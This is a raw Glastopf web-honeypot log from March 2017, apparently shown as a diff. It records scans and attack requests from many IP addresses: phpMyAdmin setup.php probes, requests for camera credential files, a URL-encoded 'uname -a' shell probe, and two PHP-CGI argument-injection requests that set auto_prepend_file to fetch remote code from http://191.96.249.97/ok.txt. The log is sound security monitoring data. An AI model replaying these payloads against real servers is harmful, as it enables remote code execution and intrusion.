+2017-03-20 23:55:41,443 (glastopf.glastopf) 184.186.75.199 requested GET / on 13dc3d8ebca9:80
+2017-03-20 23:55:43,819 (glastopf.glastopf) 184.186.75.199 requested GET / on 13dc3d8ebca9:80
+2017-03-20 23:55:50,774 (glastopf.glastopf) 184.186.75.199 requested GET / on 13dc3d8ebca9:80
+2017-03-20 23:55:55,795 (glastopf.glastopf) 184.186.75.199 requested GET / on 13dc3d8ebca9:80
+2017-03-21 00:04:22,906 (glastopf.glastopf) 110.159.145.135 requested GET / on 13dc3d8ebca9:80
+2017-03-21 03:27:19,012 (glastopf.glastopf) 189.238.115.136 requested GET / on 13dc3d8ebca9:80
+2017-03-21 03:30:57,513 (glastopf.glastopf) 193.63.58.83 requested GET / on 13dc3d8ebca9:80
+2017-03-21 05:27:46,803 (glastopf.glastopf) 27.2.6.102 requested GET / on 13dc3d8ebca9:80
+2017-03-21 07:33:43,949 (glastopf.glastopf) 78.73.29.96 requested GET / on 13dc3d8ebca9:80
+2017-03-21 07:42:24,795 (glastopf.glastopf) 36.80.121.51 requested GET / on 13dc3d8ebca9:80
+2017-03-21 08:08:01,341 (glastopf.glastopf) 93.208.105.162 requested GET / on 13dc3d8ebca9:80
+2017-03-21 11:07:50,064 (glastopf.glastopf) 171.235.61.5 requested GET / on 13dc3d8ebca9:80
+2017-03-21 11:54:13,543 (glastopf.glastopf) 23.247.72.19 requested GET / on 13dc3d8ebca9:80
+2017-03-21 16:26:55,230 (glastopf.glastopf) 125.163.173.177 requested GET / on 13dc3d8ebca9:80
+2017-03-21 18:28:51,250 (glastopf.glastopf) 66.102.6.145 requested GET / on 13dc3d8ebca9:80
+2017-03-21 18:28:51,322 (glastopf.glastopf) 66.102.6.144 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-21 19:36:24,368 (glastopf.glastopf) 70.32.33.90 requested GET / on 13dc3d8ebca9:80
+2017-03-21 19:41:35,090 (glastopf.glastopf) 187.179.184.194 requested GET / on 13dc3d8ebca9:80
+2017-03-21 19:55:38,487 (glastopf.glastopf) 201.97.13.245 requested GET / on 13dc3d8ebca9:80
+2017-03-21 22:27:44,504 (glastopf.glastopf) 110.169.83.135 requested GET / on 13dc3d8ebca9:80
+2017-03-21 23:06:04,598 (glastopf.glastopf) 101.201.52.186 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-21 23:15:04,927 (glastopf.glastopf) 191.96.249.97 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-22 03:19:34,434 (glastopf.glastopf) 60.52.98.162 requested GET / on 13dc3d8ebca9:80
+2017-03-22 03:43:54,392 (glastopf.glastopf) 139.162.119.197 requested GET / on 13dc3d8ebca9:80
+2017-03-22 05:09:48,261 (glastopf.glastopf) 1.55.78.30 requested GET / on 13dc3d8ebca9:80
+2017-03-22 05:18:59,042 (glastopf.glastopf) 60.57.55.242 requested GET / on 13dc3d8ebca9:80
+2017-03-22 09:23:57,418 (glastopf.glastopf) 185.169.230.8 requested GET / on 13dc3d8ebca9:80
+2017-03-22 09:53:04,894 (glastopf.glastopf) 92.39.33.39 requested GET / on 13dc3d8ebca9:80
+2017-03-22 10:22:49,817 (glastopf.glastopf) 60.191.38.77 requested GET /current_config/passwd on 13dc3d8ebca9:80
+2017-03-22 10:22:50,205 (glastopf.glastopf) 60.191.38.77 requested GET /current_config/Account1 on 13dc3d8ebca9:80
+2017-03-22 10:29:15,492 (glastopf.glastopf) 183.129.160.229 requested GET /current_config/passwd on 13dc3d8ebca9:80
+2017-03-22 10:59:28,832 (glastopf.glastopf) 139.162.124.167 requested GET / on 13dc3d8ebca9:80
+2017-03-22 11:38:49,773 (glastopf.glastopf) 64.213.247.80 requested HEAD / on 13dc3d8ebca9:80
+2017-03-22 11:39:21,778 (glastopf.glastopf) 125.64.94.200 requested GET / on 13dc3d8ebca9:80
+2017-03-22 12:31:06,485 (glastopf.glastopf) 60.191.38.77 requested GET /current_config/passwd on 13dc3d8ebca9:80
+2017-03-22 12:31:06,955 (glastopf.glastopf) 60.191.38.77 requested GET /current_config/Account1 on 13dc3d8ebca9:80
+2017-03-22 12:49:07,130 (glastopf.glastopf) 118.70.194.156 requested GET / on 13dc3d8ebca9:80
+2017-03-22 14:02:34,632 (glastopf.glastopf) 125.46.76.23 requested POST / on 13dc3d8ebca9:80
+2017-03-22 14:23:47,837 (glastopf.glastopf) 185.169.230.8 requested GET / on 13dc3d8ebca9:80
+2017-03-22 15:33:18,067 (glastopf.glastopf) 183.129.160.229 requested GET /current_config/passwd on 13dc3d8ebca9:80
+2017-03-22 17:00:59,616 (glastopf.glastopf) 66.102.6.78 requested GET / on 13dc3d8ebca9:80
+2017-03-22 17:00:59,717 (glastopf.glastopf) 66.102.6.81 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-22 18:39:33,466 (glastopf.glastopf) 185.169.230.8 requested GET / on 13dc3d8ebca9:80
+2017-03-22 19:01:40,836 (glastopf.glastopf) 180.97.106.162 requested HEAD http://180.163.113.82/check_proxy on 13dc3d8ebca9:80
+2017-03-22 20:10:27,998 (glastopf.glastopf) 193.59.16.69 requested GET / on 13dc3d8ebca9:80
+2017-03-22 20:46:35,860 (glastopf.glastopf) 66.102.6.81 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-22 20:53:33,399 (glastopf.glastopf) 185.169.230.8 requested GET / on 13dc3d8ebca9:80
+2017-03-22 22:44:45,752 (glastopf.glastopf) 185.110.132.231 requested GET / on 13dc3d8ebca9:80
+2017-03-22 23:06:38,569 (glastopf.glastopf) 185.169.230.8 requested GET / on 13dc3d8ebca9:80
+2017-03-22 23:13:13,009 (glastopf.glastopf) 191.96.249.97 requested GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n on 13dc3d8ebca9:80
+2017-03-22 23:13:13,312 (glastopf.modules.handlers.emulators.rfi) Failed to fetch injected file, I/O error: HTTP Error 404: Not Found
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/Glastopf-3.1.3_dev-py2.7.egg/glastopf/modules/handlers/emulators/rfi.py", line 65, in download_file
+    injected_file = urllib2.urlopen(req, timeout=4).read()
+  File "/usr/lib/python2.7/urllib2.py", line 127, in urlopen
+    return _opener.open(url, data, timeout)
+  File "/usr/lib/python2.7/urllib2.py", line 410, in open
+    response = meth(req, response)
+  File "/usr/lib/python2.7/urllib2.py", line 523, in http_response
+    'http', request, response, code, msg, hdrs)
+  File "/usr/lib/python2.7/urllib2.py", line 448, in error
+    return self._call_chain(*args)
+  File "/usr/lib/python2.7/urllib2.py", line 382, in _call_chain
+    result = func(*args)
+  File "/usr/lib/python2.7/urllib2.py", line 531, in http_error_default
+    raise HTTPError(req.get_full_url(), code, msg, hdrs, fp)
+HTTPError: HTTP Error 404: Not Found
+2017-03-23 00:54:59,682 (glastopf.glastopf) 196.52.43.59 requested GET / on 13dc3d8ebca9:80
+2017-03-23 00:55:35,348 (glastopf.glastopf) 91.114.162.253 requested GET / on 13dc3d8ebca9:80
+2017-03-23 01:34:16,931 (glastopf.glastopf) 59.33.252.249 requested POST / on 13dc3d8ebca9:80
+2017-03-23 01:39:57,303 (glastopf.glastopf) 122.148.26.83 requested GET / on 13dc3d8ebca9:80
+2017-03-23 01:39:57,644 (glastopf.glastopf) 122.148.26.83 requested GET /style.css on 13dc3d8ebca9:80
+2017-03-23 01:39:57,969 (glastopf.glastopf) 122.148.26.83 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-23 02:29:10,930 (glastopf.glastopf) 14.63.160.219 requested GET /manager/html on 13dc3d8ebca9:80
+2017-03-23 02:29:11,410 (glastopf.glastopf) 14.63.160.219 requested GET /maque66959401/index.jsp on 13dc3d8ebca9:80
+2017-03-23 02:51:18,204 (glastopf.glastopf) 47.203.88.36 requested GET http://httpheader.net/ on 13dc3d8ebca9:80
+2017-03-23 03:20:25,114 (glastopf.glastopf) 60.191.38.77 requested GET /current_config/passwd on 13dc3d8ebca9:80
+2017-03-23 03:20:25,543 (glastopf.glastopf) 60.191.38.77 requested GET /current_config/Account1 on 13dc3d8ebca9:80
+2017-03-23 04:27:42,168 (glastopf.glastopf) 86.198.29.90 requested GET / on 13dc3d8ebca9:80
+2017-03-23 06:03:17,797 (glastopf.glastopf) 115.159.187.112 requested GET /phpmyadmin on 13dc3d8ebca9:80
+2017-03-23 06:14:55,855 (glastopf.glastopf) 139.162.114.70 requested GET / on 13dc3d8ebca9:80
+2017-03-23 06:15:53,955 (glastopf.glastopf) 203.196.92.14 requested GET / on 13dc3d8ebca9:80
+2017-03-23 09:16:34,043 (glastopf.glastopf) 46.190.55.152 requested GET / on 13dc3d8ebca9:80
+2017-03-23 09:41:04,378 (glastopf.glastopf) 84.177.13.49 requested GET / on 13dc3d8ebca9:80
+2017-03-23 11:17:58,483 (glastopf.glastopf) 81.132.172.150 requested GET / on 13dc3d8ebca9:80
+2017-03-23 14:23:37,662 (glastopf.glastopf) 173.198.17.98 requested GET / on 13dc3d8ebca9:80
+2017-03-23 17:15:55,218 (glastopf.glastopf) 66.102.6.210 requested GET / on 13dc3d8ebca9:80
+2017-03-23 17:15:55,333 (glastopf.glastopf) 66.102.6.142 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-24 01:40:48,870 (glastopf.glastopf) 14.177.15.160 requested GET / on 13dc3d8ebca9:80
+2017-03-24 01:55:09,581 (glastopf.glastopf) 185.169.230.8 requested GET / on 13dc3d8ebca9:80
+2017-03-24 02:16:24,500 (glastopf.glastopf) 83.132.161.179 requested GET / on 13dc3d8ebca9:80
+2017-03-24 05:02:29,826 (glastopf.glastopf) 185.169.230.8 requested GET / on 13dc3d8ebca9:80
+2017-03-24 05:27:05,522 (glastopf.glastopf) 189.141.243.107 requested GET / on 13dc3d8ebca9:80
+2017-03-24 06:00:20,988 (glastopf.glastopf) 183.129.160.229 requested GET /current_config/Account1 on 13dc3d8ebca9:80
+2017-03-24 06:23:49,079 (glastopf.glastopf) 201.146.176.106 requested GET / on 13dc3d8ebca9:80
+2017-03-24 07:00:41,421 (glastopf.glastopf) 185.169.230.8 requested GET / on 13dc3d8ebca9:80
+2017-03-24 08:38:12,947 (glastopf.glastopf) 79.191.66.94 requested GET / on 13dc3d8ebca9:80
+2017-03-24 08:42:49,611 (glastopf.glastopf) 191.96.249.97 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-24 10:11:41,766 (glastopf.glastopf) 23.247.88.4 requested GET / on 13dc3d8ebca9:80
+2017-03-24 12:43:17,132 (glastopf.glastopf) 119.29.206.19 requested GET / on 13dc3d8ebca9:80
+2017-03-24 13:31:53,600 (glastopf.glastopf) 191.96.249.97 requested GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n on 13dc3d8ebca9:80
+2017-03-24 13:31:53,833 (glastopf.modules.handlers.emulators.rfi) Failed to fetch injected file, I/O error: HTTP Error 404: Not Found
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/Glastopf-3.1.3_dev-py2.7.egg/glastopf/modules/handlers/emulators/rfi.py", line 65, in download_file
+    injected_file = urllib2.urlopen(req, timeout=4).read()
+  File "/usr/lib/python2.7/urllib2.py", line 127, in urlopen
+    return _opener.open(url, data, timeout)
+  File "/usr/lib/python2.7/urllib2.py", line 410, in open
+    response = meth(req, response)
+  File "/usr/lib/python2.7/urllib2.py", line 523, in http_response
+    'http', request, response, code, msg, hdrs)
+  File "/usr/lib/python2.7/urllib2.py", line 448, in error
+    return self._call_chain(*args)
+  File "/usr/lib/python2.7/urllib2.py", line 382, in _call_chain
+    result = func(*args)
+  File "/usr/lib/python2.7/urllib2.py", line 531, in http_error_default
+    raise HTTPError(req.get_full_url(), code, msg, hdrs, fp)
+HTTPError: HTTP Error 404: Not Found
+2017-03-24 13:47:12,818 (glastopf.glastopf) 87.67.180.37 requested GET / on 13dc3d8ebca9:80
+2017-03-24 19:10:39,163 (glastopf.glastopf) 64.233.172.144 requested GET / on 13dc3d8ebca9:80
+2017-03-24 19:10:39,238 (glastopf.glastopf) 64.233.172.142 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-24 19:45:22,550 (glastopf.glastopf) 1.4.142.126 requested GET / on 13dc3d8ebca9:80
+2017-03-24 19:52:49,541 (glastopf.glastopf) 185.110.132.231 requested GET / on 13dc3d8ebca9:80
+2017-03-24 20:13:33,535 (glastopf.glastopf) 81.213.142.175 requested GET / on 13dc3d8ebca9:80
+2017-03-24 22:15:32,102 (glastopf.glastopf) 139.162.124.167 requested GET / on 13dc3d8ebca9:80
+2017-03-24 22:27:21,345 (glastopf.glastopf) 201.137.199.224 requested GET / on 13dc3d8ebca9:80
+2017-03-24 23:29:17,606 (glastopf.glastopf) 89.248.172.90 requested GET http://httpheader.net/ on 13dc3d8ebca9:80
+2017-03-25 02:41:22,635 (glastopf.glastopf) 189.168.55.43 requested GET / on 13dc3d8ebca9:80
+2017-03-25 04:47:00,199 (glastopf.glastopf) 38.128.88.200 requested GET / on 13dc3d8ebca9:80
+2017-03-25 06:13:12,553 (glastopf.glastopf) 187.170.169.76 requested GET / on 13dc3d8ebca9:80
+2017-03-25 06:51:49,972 (glastopf.glastopf) 191.96.249.97 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:39:00,066 (glastopf.glastopf) 36.74.193.38 requested GET / on 13dc3d8ebca9:80
+2017-03-25 07:41:18,792 (glastopf.glastopf) 93.174.93.222 requested GET /muieblackcat on 13dc3d8ebca9:80
+2017-03-25 07:41:18,989 (glastopf.glastopf) 93.174.93.222 requested GET //scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:19,187 (glastopf.glastopf) 93.174.93.222 requested GET //admin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:19,376 (glastopf.glastopf) 93.174.93.222 requested GET //admin/pma/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:19,612 (glastopf.glastopf) 93.174.93.222 requested GET //myadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:19,819 (glastopf.glastopf) 93.174.93.222 requested GET //mysql/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:20,023 (glastopf.glastopf) 93.174.93.222 requested GET //phpadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:20,222 (glastopf.glastopf) 93.174.93.222 requested GET //pma/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:20,438 (glastopf.glastopf) 93.174.93.222 requested GET //blog/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:20,648 (glastopf.glastopf) 93.174.93.222 requested GET //php/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:20,848 (glastopf.glastopf) 93.174.93.222 requested GET //phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:21,053 (glastopf.glastopf) 93.174.93.222 requested GET //phpMyAdmin2/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:21,278 (glastopf.glastopf) 93.174.93.222 requested GET //dbadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:21,483 (glastopf.glastopf) 93.174.93.222 requested GET //admin/sql/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:21,677 (glastopf.glastopf) 93.174.93.222 requested GET //database/sql/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:21,886 (glastopf.glastopf) 93.174.93.222 requested GET //web/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:22,093 (glastopf.glastopf) 93.174.93.222 requested GET //php/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:22,304 (glastopf.glastopf) 93.174.93.222 requested GET //admin/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:22,514 (glastopf.glastopf) 93.174.93.222 requested GET //php/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:22,708 (glastopf.glastopf) 93.174.93.222 requested GET //db/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:22,927 (glastopf.glastopf) 93.174.93.222 requested GET //admin/mysql/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:23,131 (glastopf.glastopf) 93.174.93.222 requested GET //administrator/components/com_joommyadmin/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:23,336 (glastopf.glastopf) 93.174.93.222 requested GET //admn/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:23,553 (glastopf.glastopf) 93.174.93.222 requested GET //apache-default/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:23,753 (glastopf.glastopf) 93.174.93.222 requested GET //blog/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:23,954 (glastopf.glastopf) 93.174.93.222 requested GET //forum/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:24,160 (glastopf.glastopf) 93.174.93.222 requested GET //htdocs/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:24,404 (glastopf.glastopf) 93.174.93.222 requested GET //httpdocs/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:24,604 (glastopf.glastopf) 93.174.93.222 requested GET //php/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:24,810 (glastopf.glastopf) 93.174.93.222 requested GET //php/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:25,022 (glastopf.glastopf) 93.174.93.222 requested GET //xampp/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:41:25,227 (glastopf.glastopf) 93.174.93.222 requested GET //websql/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-25 07:44:32,494 (glastopf.glastopf) 185.121.208.16 requested GET / on 13dc3d8ebca9:80
+2017-03-25 09:55:02,784 (glastopf.glastopf) 190.10.9.28 requested POST / on 13dc3d8ebca9:80
+2017-03-25 09:55:03,437 (glastopf.glastopf) 190.10.9.28 requested POST / on 13dc3d8ebca9:80
+2017-03-25 09:55:03,874 (glastopf.glastopf) 190.10.9.28 requested POST / on 13dc3d8ebca9:80
+2017-03-25 10:43:21,997 (glastopf.glastopf) 192.200.206.228 requested GET / on 13dc3d8ebca9:80
+2017-03-25 11:12:56,328 (glastopf.glastopf) 113.200.200.40 requested GET /phpmyadmin on 13dc3d8ebca9:80
+2017-03-25 11:22:05,441 (glastopf.glastopf) 112.120.64.151 requested GET / on 13dc3d8ebca9:80
+2017-03-25 17:46:50,066 (glastopf.glastopf) 47.203.88.36 requested GET http://httpheader.net/ on 13dc3d8ebca9:80
+2017-03-25 18:57:42,271 (glastopf.glastopf) 47.203.88.36 requested GET http://httpheader.net/ on 13dc3d8ebca9:80
+2017-03-25 20:54:49,650 (glastopf.glastopf) 125.164.229.166 requested GET / on 13dc3d8ebca9:80
+2017-03-25 22:11:05,566 (glastopf.glastopf) 139.199.26.103 requested GET /shell?%75%6E%61%6D%65%20%2D%61 on 13dc3d8ebca9:80
